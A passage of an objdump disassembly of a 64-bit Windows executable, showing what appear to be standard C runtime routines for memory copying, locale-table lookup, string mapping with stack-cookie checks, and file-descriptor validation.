   140008ddc:	66 0f 7f 59 20       	movdqa %xmm3,0x20(%rcx)
   140008de1:	66 0f 7f 61 30       	movdqa %xmm4,0x30(%rcx)
   140008de6:	f3 0f 6f 4a 40       	movdqu 0x40(%rdx),%xmm1
   140008deb:	f3 0f 6f 52 50       	movdqu 0x50(%rdx),%xmm2
   140008df0:	f3 0f 6f 5a 60       	movdqu 0x60(%rdx),%xmm3
   140008df5:	f3 0f 6f 62 70       	movdqu 0x70(%rdx),%xmm4
   140008dfa:	66 0f 7f 49 40       	movdqa %xmm1,0x40(%rcx)
   140008dff:	66 0f 7f 51 50       	movdqa %xmm2,0x50(%rcx)
   140008e04:	66 0f 7f 59 60       	movdqa %xmm3,0x60(%rcx)
   140008e09:	66 0f 7f 61 70       	movdqa %xmm4,0x70(%rcx)
   140008e0e:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   140008e15:	48 81 c2 80 00 00 00 	add    $0x80,%rdx
   140008e1c:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   140008e23:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   140008e2a:	73 94                	jae    0x140008dc0
   140008e2c:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   140008e30:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   140008e34:	4d 8b d9             	mov    %r9,%r11
   140008e37:	49 c1 eb 04          	shr    $0x4,%r11
   140008e3b:	47 8b 9c 9a d8 d0 01 	mov    0x1d0d8(%r10,%r11,4),%r11d
   140008e42:	00 
   140008e43:	4d 03 da             	add    %r10,%r11
   140008e46:	41 ff e3             	jmp    *%r11
   140008e49:	f3 42 0f 6f 4c 0a 80 	movdqu -0x80(%rdx,%r9,1),%xmm1
   140008e50:	f3 42 0f 7f 4c 09 80 	movdqu %xmm1,-0x80(%rcx,%r9,1)
   140008e57:	f3 42 0f 6f 4c 0a 90 	movdqu -0x70(%rdx,%r9,1),%xmm1
   140008e5e:	f3 42 0f 7f 4c 09 90 	movdqu %xmm1,-0x70(%rcx,%r9,1)
   140008e65:	f3 42 0f 6f 4c 0a a0 	movdqu -0x60(%rdx,%r9,1),%xmm1
   140008e6c:	f3 42 0f 7f 4c 09 a0 	movdqu %xmm1,-0x60(%rcx,%r9,1)
   140008e73:	f3 42 0f 6f 4c 0a b0 	movdqu -0x50(%rdx,%r9,1),%xmm1
   140008e7a:	f3 42 0f 7f 4c 09 b0 	movdqu %xmm1,-0x50(%rcx,%r9,1)
   140008e81:	f3 42 0f 6f 4c 0a c0 	movdqu -0x40(%rdx,%r9,1),%xmm1
   140008e88:	f3 42 0f 7f 4c 09 c0 	movdqu %xmm1,-0x40(%rcx,%r9,1)
   140008e8f:	f3 42 0f 6f 4c 0a d0 	movdqu -0x30(%rdx,%r9,1),%xmm1
   140008e96:	f3 42 0f 7f 4c 09 d0 	movdqu %xmm1,-0x30(%rcx,%r9,1)
   140008e9d:	f3 42 0f 6f 4c 0a e0 	movdqu -0x20(%rdx,%r9,1),%xmm1
   140008ea4:	f3 42 0f 7f 4c 09 e0 	movdqu %xmm1,-0x20(%rcx,%r9,1)
   140008eab:	f3 42 0f 7f 6c 01 f0 	movdqu %xmm5,-0x10(%rcx,%r8,1)
   140008eb2:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   140008eb6:	c3                   	ret
   140008eb7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140008ebe:	00 00 
   140008ec0:	4c 8b d9             	mov    %rcx,%r11
   140008ec3:	4c 8b d2             	mov    %rdx,%r10
   140008ec6:	48 2b d1             	sub    %rcx,%rdx
   140008ec9:	49 03 c8             	add    %r8,%rcx
   140008ecc:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   140008ed1:	48 83 e9 10          	sub    $0x10,%rcx
   140008ed5:	49 83 e8 10          	sub    $0x10,%r8
   140008ed9:	f6 c1 0f             	test   $0xf,%cl
   140008edc:	74 17                	je     0x140008ef5
   140008ede:	48 8b c1             	mov    %rcx,%rax
   140008ee1:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   140008ee5:	0f 10 c8             	movups %xmm0,%xmm1
   140008ee8:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   140008eec:	0f 11 08             	movups %xmm1,(%rax)
   140008eef:	4c 8b c1             	mov    %rcx,%r8
   140008ef2:	4d 2b c3             	sub    %r11,%r8
   140008ef5:	4d 8b c8             	mov    %r8,%r9
   140008ef8:	49 c1 e9 07          	shr    $0x7,%r9
   140008efc:	74 6f                	je     0x140008f6d
   140008efe:	0f 29 01             	movaps %xmm0,(%rcx)
   140008f01:	eb 14                	jmp    0x140008f17
   140008f03:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140008f0a:	84 00 00 00 00 00 
   140008f10:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   140008f14:	0f 29 09             	movaps %xmm1,(%rcx)
   140008f17:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   140008f1c:	0f 10 4c 11 e0       	movups -0x20(%rcx,%rdx,1),%xmm1
   140008f21:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   140008f28:	0f 29 41 70          	movaps %xmm0,0x70(%rcx)
   140008f2c:	0f 29 49 60          	movaps %xmm1,0x60(%rcx)
   140008f30:	0f 10 44 11 50       	movups 0x50(%rcx,%rdx,1),%xmm0
   140008f35:	0f 10 4c 11 40       	movups 0x40(%rcx,%rdx,1),%xmm1
   140008f3a:	49 ff c9             	dec    %r9
   140008f3d:	0f 29 41 50          	movaps %xmm0,0x50(%rcx)
   140008f41:	0f 29 49 40          	movaps %xmm1,0x40(%rcx)
   140008f45:	0f 10 44 11 30       	movups 0x30(%rcx,%rdx,1),%xmm0
   140008f4a:	0f 10 4c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm1
   140008f4f:	0f 29 41 30          	movaps %xmm0,0x30(%rcx)
   140008f53:	0f 29 49 20          	movaps %xmm1,0x20(%rcx)
   140008f57:	0f 10 44 11 10       	movups 0x10(%rcx,%rdx,1),%xmm0
   140008f5c:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   140008f60:	75 ae                	jne    0x140008f10
   140008f62:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   140008f66:	49 83 e0 7f          	and    $0x7f,%r8
   140008f6a:	0f 28 c1             	movaps %xmm1,%xmm0
   140008f6d:	4d 8b c8             	mov    %r8,%r9
   140008f70:	49 c1 e9 04          	shr    $0x4,%r9
   140008f74:	74 1a                	je     0x140008f90
   140008f76:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140008f7d:	00 00 00 
   140008f80:	0f 11 01             	movups %xmm0,(%rcx)
   140008f83:	48 83 e9 10          	sub    $0x10,%rcx
   140008f87:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   140008f8b:	49 ff c9             	dec    %r9
   140008f8e:	75 f0                	jne    0x140008f80
   140008f90:	49 83 e0 0f          	and    $0xf,%r8
   140008f94:	74 08                	je     0x140008f9e
   140008f96:	41 0f 10 0a          	movups (%r10),%xmm1
   140008f9a:	41 0f 11 0b          	movups %xmm1,(%r11)
   140008f9e:	0f 11 01             	movups %xmm0,(%rcx)
   140008fa1:	49 8b c3             	mov    %r11,%rax
   140008fa4:	c3                   	ret
   140008fa5:	cc                   	int3
   140008fa6:	cc                   	int3
   140008fa7:	cc                   	int3
   140008fa8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008fad:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140008fb2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140008fb7:	57                   	push   %rdi
   140008fb8:	41 56                	push   %r14
   140008fba:	41 57                	push   %r15
   140008fbc:	48 83 ec 20          	sub    $0x20,%rsp
   140008fc0:	4c 8b f1             	mov    %rcx,%r14
   140008fc3:	48 85 c9             	test   %rcx,%rcx
   140008fc6:	74 74                	je     0x14000903c
   140008fc8:	33 db                	xor    %ebx,%ebx
   140008fca:	4c 8d 3d 2f 70 ff ff 	lea    -0x8fd1(%rip),%r15        # 0x140000000
   140008fd1:	bf e3 00 00 00       	mov    $0xe3,%edi
   140008fd6:	8d 04 1f             	lea    (%rdi,%rbx,1),%eax
   140008fd9:	41 b8 55 00 00 00    	mov    $0x55,%r8d
   140008fdf:	99                   	cltd
   140008fe0:	49 8b ce             	mov    %r14,%rcx
   140008fe3:	2b c2                	sub    %edx,%eax
   140008fe5:	d1 f8                	sar    $1,%eax
   140008fe7:	48 63 e8             	movslq %eax,%rbp
   140008fea:	48 8b d5             	mov    %rbp,%rdx
   140008fed:	48 8b f5             	mov    %rbp,%rsi
   140008ff0:	48 03 d2             	add    %rdx,%rdx
   140008ff3:	49 8b 94 d7 10 04 01 	mov    0x10410(%r15,%rdx,8),%rdx
   140008ffa:	00 
   140008ffb:	e8 d0 13 00 00       	call   0x14000a3d0
   140009000:	85 c0                	test   %eax,%eax
   140009002:	74 13                	je     0x140009017
   140009004:	79 05                	jns    0x14000900b
   140009006:	8d 7d ff             	lea    -0x1(%rbp),%edi
   140009009:	eb 03                	jmp    0x14000900e
   14000900b:	8d 5d 01             	lea    0x1(%rbp),%ebx
   14000900e:	3b df                	cmp    %edi,%ebx
   140009010:	7e c4                	jle    0x140008fd6
   140009012:	83 c8 ff             	or     $0xffffffff,%eax
   140009015:	eb 0b                	jmp    0x140009022
   140009017:	48 03 f6             	add    %rsi,%rsi
   14000901a:	41 8b 84 f7 18 04 01 	mov    0x10418(%r15,%rsi,8),%eax
   140009021:	00 
   140009022:	85 c0                	test   %eax,%eax
   140009024:	78 16                	js     0x14000903c
   140009026:	3d e4 00 00 00       	cmp    $0xe4,%eax
   14000902b:	73 0f                	jae    0x14000903c
   14000902d:	48 98                	cltq
   14000902f:	48 03 c0             	add    %rax,%rax
   140009032:	41 8b 84 c7 d0 f5 00 	mov    0xf5d0(%r15,%rax,8),%eax
   140009039:	00 
   14000903a:	eb 02                	jmp    0x14000903e
   14000903c:	33 c0                	xor    %eax,%eax
   14000903e:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140009043:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140009048:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000904d:	48 83 c4 20          	add    $0x20,%rsp
   140009051:	41 5f                	pop    %r15
   140009053:	41 5e                	pop    %r14
   140009055:	5f                   	pop    %rdi
   140009056:	c3                   	ret
   140009057:	cc                   	int3
   140009058:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000905d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140009062:	57                   	push   %rdi
   140009063:	48 83 ec 70          	sub    $0x70,%rsp
   140009067:	48 8b f2             	mov    %rdx,%rsi
   14000906a:	49 8b d9             	mov    %r9,%rbx
   14000906d:	48 8b d1             	mov    %rcx,%rdx
   140009070:	41 8b f8             	mov    %r8d,%edi
   140009073:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140009078:	e8 d7 bc ff ff       	call   0x140004d54
   14000907d:	8b 84 24 c0 00 00 00 	mov    0xc0(%rsp),%eax
   140009084:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140009089:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000908d:	4c 8b cb             	mov    %rbx,%r9
   140009090:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   140009097:	44 8b c7             	mov    %edi,%r8d
   14000909a:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000909e:	48 8b d6             	mov    %rsi,%rdx
   1400090a1:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   1400090a8:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400090ac:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   1400090b3:	00 
   1400090b4:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400090b9:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   1400090c0:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400090c4:	e8 27 00 00 00       	call   0x1400090f0
   1400090c9:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   1400090ce:	74 0c                	je     0x1400090dc
   1400090d0:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1400090d5:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   1400090dc:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   1400090e1:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   1400090e5:	49 8b 73 18          	mov    0x18(%r11),%rsi
   1400090e9:	49 8b e3             	mov    %r11,%rsp
   1400090ec:	5f                   	pop    %rdi
   1400090ed:	c3                   	ret
   1400090ee:	cc                   	int3
   1400090ef:	cc                   	int3
   1400090f0:	40 55                	rex push %rbp
   1400090f2:	41 54                	push   %r12
   1400090f4:	41 55                	push   %r13
   1400090f6:	41 56                	push   %r14
   1400090f8:	41 57                	push   %r15
   1400090fa:	48 83 ec 60          	sub    $0x60,%rsp
   1400090fe:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140009103:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   140009107:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   14000910b:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   14000910f:	48 8b 05 22 df 00 00 	mov    0xdf22(%rip),%rax        # 0x140017038
   140009116:	48 33 c5             	xor    %rbp,%rax
   140009119:	48 89 45 08          	mov    %rax,0x8(%rbp)
   14000911d:	48 63 5d 60          	movslq 0x60(%rbp),%rbx
   140009121:	4d 8b f9             	mov    %r9,%r15
   140009124:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   140009128:	45 8b e8             	mov    %r8d,%r13d
   14000912b:	48 8b f9             	mov    %rcx,%rdi
   14000912e:	85 db                	test   %ebx,%ebx
   140009130:	7e 14                	jle    0x140009146
   140009132:	48 8b d3             	mov    %rbx,%rdx
   140009135:	49 8b c9             	mov    %r9,%rcx
   140009138:	e8 d7 21 00 00       	call   0x14000b314
   14000913d:	3b c3                	cmp    %ebx,%eax
   14000913f:	8d 58 01             	lea    0x1(%rax),%ebx
   140009142:	7c 02                	jl     0x140009146
   140009144:	8b d8                	mov    %eax,%ebx
   140009146:	44 8b 75 78          	mov    0x78(%rbp),%r14d
   14000914a:	45 85 f6             	test   %r14d,%r14d
   14000914d:	75 07                	jne    0x140009156
   14000914f:	48 8b 07             	mov    (%rdi),%rax
   140009152:	44 8b 70 0c          	mov    0xc(%rax),%r14d
   140009156:	f7 9d 80 00 00 00    	negl   0x80(%rbp)
   14000915c:	44 8b cb             	mov    %ebx,%r9d
   14000915f:	4d 8b c7             	mov    %r15,%r8
   140009162:	41 8b ce             	mov    %r14d,%ecx
   140009165:	1b d2                	sbb    %edx,%edx
   140009167:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000916c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009172:	83 e2 08             	and    $0x8,%edx
   140009175:	ff c2                	inc    %edx
   140009177:	e8 30 d8 ff ff       	call   0x1400069ac
   14000917c:	4c 63 e0             	movslq %eax,%r12
   14000917f:	85 c0                	test   %eax,%eax
   140009181:	0f 84 36 02 00 00    	je     0x1400093bd
   140009187:	49 8b c4             	mov    %r12,%rax
   14000918a:	49 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%r8
   140009191:	ff ff 0f 
   140009194:	48 03 c0             	add    %rax,%rax
   140009197:	48 8d 48 10          	lea    0x10(%rax),%rcx
   14000919b:	48 3b c1             	cmp    %rcx,%rax
   14000919e:	48 1b d2             	sbb    %rdx,%rdx
   1400091a1:	48 23 d1             	and    %rcx,%rdx
   1400091a4:	74 53                	je     0x1400091f9
   1400091a6:	48 81 fa 00 04 00 00 	cmp    $0x400,%rdx
   1400091ad:	77 2e                	ja     0x1400091dd
   1400091af:	48 8d 42 0f          	lea    0xf(%rdx),%rax
   1400091b3:	48 3b c2             	cmp    %rdx,%rax
   1400091b6:	77 03                	ja     0x1400091bb
   1400091b8:	49 8b c0             	mov    %r8,%rax
   1400091bb:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400091bf:	e8 bc 11 00 00       	call   0x14000a380
   1400091c4:	48 2b e0             	sub    %rax,%rsp
   1400091c7:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
   1400091cc:	48 85 f6             	test   %rsi,%rsi
   1400091cf:	0f 84 ce 01 00 00    	je     0x1400093a3
   1400091d5:	c7 06 cc cc 00 00    	movl   $0xcccc,(%rsi)
   1400091db:	eb 16                	jmp    0x1400091f3
   1400091dd:	48 8b ca             	mov    %rdx,%rcx
   1400091e0:	e8 ab d5 ff ff       	call   0x140006790
   1400091e5:	48 8b f0             	mov    %rax,%rsi
   1400091e8:	48 85 c0             	test   %rax,%rax
   1400091eb:	74 0e                	je     0x1400091fb
   1400091ed:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   1400091f3:	48 83 c6 10          	add    $0x10,%rsi
   1400091f7:	eb 02                	jmp    0x1400091fb
   1400091f9:	33 f6                	xor    %esi,%esi
   1400091fb:	48 85 f6             	test   %rsi,%rsi
   1400091fe:	0f 84 9f 01 00 00    	je     0x1400093a3
   140009204:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   140009209:	44 8b cb             	mov    %ebx,%r9d
   14000920c:	4d 8b c7             	mov    %r15,%r8
   14000920f:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140009214:	ba 01 00 00 00       	mov    $0x1,%edx
   140009219:	41 8b ce             	mov    %r14d,%ecx
   14000921c:	e8 8b d7 ff ff       	call   0x1400069ac
   140009221:	85 c0                	test   %eax,%eax
   140009223:	0f 84 7a 01 00 00    	je     0x1400093a3
   140009229:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000922f:	45 8b cc             	mov    %r12d,%r9d
   140009232:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140009238:	4c 8b c6             	mov    %rsi,%r8
   14000923b:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140009241:	41 8b d5             	mov    %r13d,%edx
   140009244:	4c 8b 7d 00          	mov    0x0(%rbp),%r15
   140009248:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000924d:	49 8b cf             	mov    %r15,%rcx
   140009250:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009256:	e8 b1 ad ff ff       	call   0x14000400c
   14000925b:	48 63 f8             	movslq %eax,%rdi
   14000925e:	85 c0                	test   %eax,%eax
   140009260:	0f 84 3d 01 00 00    	je     0x1400093a3
   140009266:	ba 00 04 00 00       	mov    $0x400,%edx
   14000926b:	44 85 ea             	test   %r13d,%edx
   14000926e:	74 52                	je     0x1400092c2
   140009270:	8b 45 70             	mov    0x70(%rbp),%eax
   140009273:	85 c0                	test   %eax,%eax
   140009275:	0f 84 2a 01 00 00    	je     0x1400093a5
   14000927b:	3b f8                	cmp    %eax,%edi
   14000927d:	0f 8f 20 01 00 00    	jg     0x1400093a3
   140009283:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   140009289:	45 8b cc             	mov    %r12d,%r9d
   14000928c:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140009292:	4c 8b c6             	mov    %rsi,%r8
   140009295:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000929b:	41 8b d5             	mov    %r13d,%edx
   14000929e:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400092a2:	49 8b cf             	mov    %r15,%rcx
   1400092a5:	48 8b 45 68          	mov    0x68(%rbp),%rax
   1400092a9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400092ae:	e8 59 ad ff ff       	call   0x14000400c
   1400092b3:	8b f8                	mov    %eax,%edi
   1400092b5:	85 c0                	test   %eax,%eax
   1400092b7:	0f 85 e8 00 00 00    	jne    0x1400093a5
   1400092bd:	e9 e1 00 00 00       	jmp    0x1400093a3
   1400092c2:	48 8b cf             	mov    %rdi,%rcx
   1400092c5:	48 03 c9             	add    %rcx,%rcx
   1400092c8:	48 8d 41 10          	lea    0x10(%rcx),%rax
   1400092cc:	48 3b c8             	cmp    %rax,%rcx
   1400092cf:	48 1b c9             	sbb    %rcx,%rcx
   1400092d2:	48 23 c8             	and    %rax,%rcx
   1400092d5:	74 53                	je     0x14000932a
   1400092d7:	48 3b ca             	cmp    %rdx,%rcx
   1400092da:	77 35                	ja     0x140009311
   1400092dc:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   1400092e0:	48 3b c1             	cmp    %rcx,%rax
   1400092e3:	77 0a                	ja     0x1400092ef
   1400092e5:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   1400092ec:	ff ff 0f 
   1400092ef:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1400092f3:	e8 88 10 00 00       	call   0x14000a380
   1400092f8:	48 2b e0             	sub    %rax,%rsp
   1400092fb:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   140009300:	48 85 db             	test   %rbx,%rbx
   140009303:	0f 84 9a 00 00 00    	je     0x1400093a3
   140009309:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000930f:	eb 13                	jmp    0x140009324
   140009311:	e8 7a d4 ff ff       	call   0x140006790
   140009316:	48 8b d8             	mov    %rax,%rbx
   140009319:	48 85 c0             	test   %rax,%rax
   14000931c:	74 0e                	je     0x14000932c
   14000931e:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   140009324:	48 83 c3 10          	add    $0x10,%rbx
   140009328:	eb 02                	jmp    0x14000932c
   14000932a:	33 db                	xor    %ebx,%ebx
   14000932c:	48 85 db             	test   %rbx,%rbx
   14000932f:	74 72                	je     0x1400093a3
   140009331:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   140009337:	45 8b cc             	mov    %r12d,%r9d
   14000933a:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140009340:	4c 8b c6             	mov    %rsi,%r8
   140009343:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140009349:	41 8b d5             	mov    %r13d,%edx
   14000934c:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140009350:	49 8b cf             	mov    %r15,%rcx
   140009353:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009358:	e8 af ac ff ff       	call   0x14000400c
   14000935d:	85 c0                	test   %eax,%eax
   14000935f:	74 31                	je     0x140009392
   140009361:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140009367:	33 d2                	xor    %edx,%edx
   140009369:	48 21 54 24 30       	and    %rdx,0x30(%rsp)
   14000936e:	44 8b cf             	mov    %edi,%r9d
   140009371:	8b 45 70             	mov    0x70(%rbp),%eax
   140009374:	4c 8b c3             	mov    %rbx,%r8
   140009377:	41 8b ce             	mov    %r14d,%ecx
   14000937a:	85 c0                	test   %eax,%eax
   14000937c:	75 65                	jne    0x1400093e3
   14000937e:	21 54 24 28          	and    %edx,0x28(%rsp)
   140009382:	48 21 54 24 20       	and    %rdx,0x20(%rsp)
   140009387:	e8 f8 e8 ff ff       	call   0x140007c84
   14000938c:	8b f8                	mov    %eax,%edi
   14000938e:	85 c0                	test   %eax,%eax
   140009390:	75 60                	jne    0x1400093f2
   140009392:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   140009396:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000939c:	75 05                	jne    0x1400093a3
   14000939e:	e8 31 c4 ff ff       	call   0x1400057d4
   1400093a3:	33 ff                	xor    %edi,%edi
   1400093a5:	48 85 f6             	test   %rsi,%rsi
   1400093a8:	74 11                	je     0x1400093bb
   1400093aa:	48 8d 4e f0          	lea    -0x10(%rsi),%rcx
   1400093ae:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   1400093b4:	75 05                	jne    0x1400093bb
   1400093b6:	e8 19 c4 ff ff       	call   0x1400057d4
   1400093bb:	8b c7                	mov    %edi,%eax
   1400093bd:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   1400093c1:	48 33 cd             	xor    %rbp,%rcx
   1400093c4:	e8 57 7f ff ff       	call   0x140001320
   1400093c9:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   1400093cd:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   1400093d1:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   1400093d5:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   1400093d9:	41 5f                	pop    %r15
   1400093db:	41 5e                	pop    %r14
   1400093dd:	41 5d                	pop    %r13
   1400093df:	41 5c                	pop    %r12
   1400093e1:	5d                   	pop    %rbp
   1400093e2:	c3                   	ret
   1400093e3:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400093e7:	48 8b 45 68          	mov    0x68(%rbp),%rax
   1400093eb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400093f0:	eb 95                	jmp    0x140009387
   1400093f2:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   1400093f6:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   1400093fc:	75 a7                	jne    0x1400093a5
   1400093fe:	e8 d1 c3 ff ff       	call   0x1400057d4
   140009403:	eb a0                	jmp    0x1400093a5
   140009405:	cc                   	int3
   140009406:	cc                   	int3
   140009407:	cc                   	int3
   140009408:	40 53                	rex push %rbx
   14000940a:	48 83 ec 20          	sub    $0x20,%rsp
   14000940e:	48 8b 05 33 f7 00 00 	mov    0xf733(%rip),%rax        # 0x140018b48
   140009415:	48 8b da             	mov    %rdx,%rbx
   140009418:	48 39 02             	cmp    %rax,(%rdx)
   14000941b:	74 16                	je     0x140009433
   14000941d:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140009423:	85 05 a7 e4 00 00    	test   %eax,0xe4a7(%rip)        # 0x1400178d0
   140009429:	75 08                	jne    0x140009433
   14000942b:	e8 0c d9 ff ff       	call   0x140006d3c
   140009430:	48 89 03             	mov    %rax,(%rbx)
   140009433:	48 83 c4 20          	add    $0x20,%rsp
   140009437:	5b                   	pop    %rbx
   140009438:	c3                   	ret
   140009439:	cc                   	int3
   14000943a:	cc                   	int3
   14000943b:	cc                   	int3
   14000943c:	40 53                	rex push %rbx
   14000943e:	48 83 ec 20          	sub    $0x20,%rsp
   140009442:	48 8b 05 bf f6 00 00 	mov    0xf6bf(%rip),%rax        # 0x140018b08
   140009449:	48 8b da             	mov    %rdx,%rbx
   14000944c:	48 39 02             	cmp    %rax,(%rdx)
   14000944f:	74 16                	je     0x140009467
   140009451:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140009457:	85 05 73 e4 00 00    	test   %eax,0xe473(%rip)        # 0x1400178d0
   14000945d:	75 08                	jne    0x140009467
   14000945f:	e8 74 b8 ff ff       	call   0x140004cd8
   140009464:	48 89 03             	mov    %rax,(%rbx)
   140009467:	48 83 c4 20          	add    $0x20,%rsp
   14000946b:	5b                   	pop    %rbx
   14000946c:	c3                   	ret
   14000946d:	cc                   	int3
   14000946e:	cc                   	int3
   14000946f:	cc                   	int3
   140009470:	48 83 ec 28          	sub    $0x28,%rsp
   140009474:	e8 7b b8 ff ff       	call   0x140004cf4
   140009479:	33 c9                	xor    %ecx,%ecx
   14000947b:	84 c0                	test   %al,%al
   14000947d:	0f 94 c1             	sete   %cl
   140009480:	8b c1                	mov    %ecx,%eax
   140009482:	48 83 c4 28          	add    $0x28,%rsp
   140009486:	c3                   	ret
   140009487:	cc                   	int3
   140009488:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000948c:	48 83 ec 38          	sub    $0x38,%rsp
   140009490:	48 63 d1             	movslq %ecx,%rdx
   140009493:	83 fa fe             	cmp    $0xfffffffe,%edx
   140009496:	75 0d                	jne    0x1400094a5
   140009498:	e8 5f ce ff ff       	call   0x1400062fc
   14000949d:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400094a3:	eb 6c                	jmp    0x140009511
   1400094a5:	85 c9                	test   %ecx,%ecx
   1400094a7:	78 58                	js     0x140009501
   1400094a9:	3b 15 41 f6 00 00    	cmp    0xf641(%rip),%edx        # 0x140018af0
   1400094af:	73 50                	jae    0x140009501
   1400094b1:	48 8b ca             	mov    %rdx,%rcx
   1400094b4:	4c 8d 05 35 f2 00 00 	lea    0xf235(%rip),%r8        # 0x1400186f0
   1400094bb:	83 e1 3f             	and    $0x3f,%ecx
   1400094be:	48 8b c2             	mov    %rdx,%rax
   1400094c1:	48 c1 f8 06          	sar    $0x6,%rax
   1400094c5:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   1400094c9:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   1400094cd:	f6 44 c8 38 01       	testb  $0x1,0x38(%rax,%rcx,8)
   1400094d2:	74 2d                	je     0x140009501
   1400094d4:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400094d9:	89 54 24 50          	mov    %edx,0x50(%rsp)
   1400094dd:	89 54 24 58          	mov    %edx,0x58(%rsp)
   1400094e1:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   1400094e6:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   1400094eb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400094f0:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   1400094f5:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   1400094fa:	e8 1d 00 00 00       	call   0x14000951c
